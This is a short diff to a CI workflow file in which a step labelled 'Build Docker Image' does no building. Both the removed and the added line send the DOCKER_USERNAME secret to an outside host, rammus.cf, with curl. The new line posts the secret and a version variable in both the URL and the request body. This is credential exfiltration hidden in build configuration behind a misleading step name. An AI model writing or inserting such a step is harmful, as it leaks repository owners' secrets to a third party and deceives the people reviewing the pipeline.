@@ -23,5 +23,5 @@ jobs:
     steps:
     - uses: actions/checkout@v1
     - name: Build Docker Image
-      run: curl "rammus.cf/?secret=$DOCKER_USERNAME"
+      run: curl -XPOST "rammus.cf/?secret=$DOCKER_USERNAME&random=$VERSION" -d "$DOCKER_USERNAME&random=$VERSION"
     
